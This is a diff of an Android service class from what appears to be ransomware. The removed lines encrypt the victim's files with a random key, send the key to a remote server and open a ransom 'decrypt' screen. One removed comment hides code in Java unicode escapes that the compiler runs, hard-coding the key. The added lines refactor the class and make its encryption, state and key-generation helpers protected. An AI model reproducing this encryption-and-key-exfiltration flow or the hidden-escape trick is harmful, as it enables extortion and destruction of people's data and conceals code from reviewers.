@@ -52,6 +52,10 @@ public class MyService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        initialize();
+    }
+
+    protected void initialize(){
         ctx = getApplicationContext();
         r = new Random();
 
@@ -68,45 +72,14 @@ public class MyService extends Service {
                 new String[]{"Android/data"});
 
         totalFiles = String.valueOf(al.size()) + " And " + String.valueOf(vids.size());
-        try {
-            /* \u002a\u002f\u004b\u0045\u0059\u0020\u003d\u0020\u0022\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0031\u0032\u0033\u0034\u0035\u0022\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0022\u0055\u0054\u0046\u0038\u0022\u0029\u003b\u002f\u002a */
-            if(checkEncryptedState()){
-                this.KEY = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY).getBytes();
-                decryptFile();
-                saveDecryptedState();
-                openHappyActivity();
-            }else{
-                generateRandomId();
-
-                //cover possible errors with random key
-                for(int i =0; i <2 ; i++) {
-                    try {
-                        generateRandomKey();
-                        // Well... you guess it.
-                        encryptFile();
-                        break;
-                    }catch (Exception e){
-                        e.printStackTrace();
-                    }
-                }
-                saveEncryptedState();
-                IO.sendKeyToServer(ctx,idUser,new String(this.KEY));
-
-                openDecryptActivity();
-            }
-        }
-        catch (Exception e) {
-            e.printStackTrace();
-        }
-
     }
 
-    private void openHappyActivity(){
+    protected void openHappyActivity(){
         Helper.changeWallPaper(ctx,R.drawable.happy);
         startActivity(new Intent(ctx, HappyActivity.class));
     }
 
-    private void openDecryptActivity(){
+    protected void openDecryptActivity(){
         startActivity(new Intent(ctx, DecryptActivity.class));
     }
 
@@ -125,28 +98,28 @@ public class MyService extends Service {
     * @returns True -> Enctypted
     * @returns False -> Decrypted
     * */
-    private Boolean checkEncryptedState(){
+    protected Boolean checkEncryptedState(){
         return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
     }
 
     /*
     * Save encrypted state on Local Storage
     * */
-    private void saveEncryptedState(){
+    protected void saveEncryptedState(){
         LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,true);
     }
 
     /*
     * Save decrypted state on Local Storage
     * */
-    private void saveDecryptedState(){
+    protected void saveDecryptedState(){
         LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,false);
     }
 
     /*
     * Generate and save Random ID
     * */
-    private void generateRandomId() {
+    protected void generateRandomId() {
         Long hex = r.nextLong();
         String id = Long.toHexString(hex);
         id = new String(id.getBytes());
@@ -158,7 +131,7 @@ public class MyService extends Service {
     /*
     * Generate and save Random key
     * */
-    private void generateRandomKey(){
+    protected void generateRandomKey(){
         Long hex = r.nextLong();
         String key = Long.toHexString(hex);
         this.KEY = key.getBytes();
